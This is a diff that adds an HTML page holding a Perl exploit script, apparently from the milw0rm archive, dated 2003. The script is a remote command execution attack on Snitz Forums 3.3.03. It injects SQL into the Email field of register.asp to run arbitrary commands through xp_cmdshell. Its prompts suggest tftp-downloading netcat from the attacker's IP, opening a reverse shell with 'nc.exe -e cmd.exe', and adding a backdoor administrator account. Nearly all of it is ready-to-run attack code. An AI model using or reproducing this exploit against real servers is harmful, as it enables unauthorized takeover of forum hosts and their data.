@@ -1,0 +1,98 @@
+<html>
+<head>
+<title>Snitz Forum 3.3.03 Remote Command Execution Exploit</title>
+<pre>
+#!/usr/bin/perl
+
+use Socket;
+
+print &quot;\nRemote command execution against Snitz Forums 3.3.03 (and probably others).\n&quot;;
+print &quot;You accept full responsibility for your actions by using this script.\n&quot;;
+print &quot;INTERNAL USE ONLY!! DO NOT DISTRIBUTE!!\n&quot;;
+
+print &quot;\nWeb server? [www.enterthegame.com]: &quot;;
+my $webserver = &lt;STDIN&gt;;
+chomp $webserver;
+if( $webserver eq &quot;&quot; )
+{
+$webserver = &quot;www.enterthegame.com&quot;;
+}
+
+print &quot;\nWeb server port? [80]: &quot;;
+my $port = &lt;STDIN&gt;;
+chomp $port;
+if( $port eq &quot;&quot; )
+{
+$port = 80;
+}
+
+print &quot;\nAbsolute path to \&quot;register.asp\&quot;? [/forum/register.asp]: &quot;;
+my $path = &lt;STDIN&gt;;
+chomp $path;
+if( $path eq &quot;&quot; )
+{
+$path = &quot;/forum/register.asp&quot;;
+}
+
+print &quot;\nCommand to execute non-interactively\n&quot;;
+print &quot; Example commands: tftp -i Your.IP.Here GET nc.exe\n&quot;;
+print &quot; nc.exe -e cmd.exe Your.IP.Here YourNetcatListeningPortHere\n&quot;;
+print &quot; or: net user h4x0r /add | net localgroup Administrators h4x0r /add\n&quot;;
+print &quot;Your command: &quot;;
+my $command = &lt;STDIN&gt;;
+chomp $command;
+$command =~ s/\ /\%20/g;
+
+if( open_TCP( FILEHANDLE, $webserver, 80 ) == undef )
+{
+print &quot;Error connecting to $webserver\n&quot;;
+exit( 0 );
+}
+else
+{
+my $data1 = $path . &quot;\?mode\=DoIt&quot;;
+my $data2 = &quot;Email\=\'\%20exec\%20master..xp_cmdshell\%20\'&quot; . $command. &quot;\'\%20--\&amp;Name\=snitz&quot;;
+my $length = length( $data2 );
+
+print FILEHANDLE &quot;POST $data1 HTTP/1.1\n&quot;;
+if( $port == 80 )
+{
+print FILEHANDLE &quot;Host: $webserver\n&quot;;
+}
+else
+{
+print FILEHANDLE &quot;Host: $webserver:$port\n&quot;;
+}
+print FILEHANDLE &quot;Accept: */*\n&quot;;
+print FILEHANDLE &quot;User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\n&quot;;
+print FILEHANDLE &quot;Keep-Alive: 300\n&quot;;
+print FILEHANDLE &quot;Referer: http:\/\/$webserver$path\?mode\=Register\n&quot;;
+print FILEHANDLE &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
+print FILEHANDLE &quot;Content-Length: $length\n\n&quot;;
+print FILEHANDLE &quot;$data2&quot;;
+
+print &quot;\nSQL injection command sent. If you are waiting for a shell on your listening\n&quot;;
+print &quot;netcat, hit \&quot;enter\&quot; a couple of times to be safe.\n\n&quot;;
+
+close( FILEHANDLE );
+}
+
+sub open_TCP
+{
+my( $FS, $dest, $port ) = @_;
+
+my $proto = getprotobyname( 'tcp' );
+socket( $FS, PF_INET, SOCK_STREAM, $proto );
+my $sin = sockaddr_in( $port, inet_aton( $dest ));
+connect( $FS, $sin ) || return undef;
+
+my $old_fh = select( $FS );
+$| = 1;
+select( $old_fh );
+return 1;
+}
+
+# milw0rm.com [2003-05-12]
+</pre>
+</html>
+
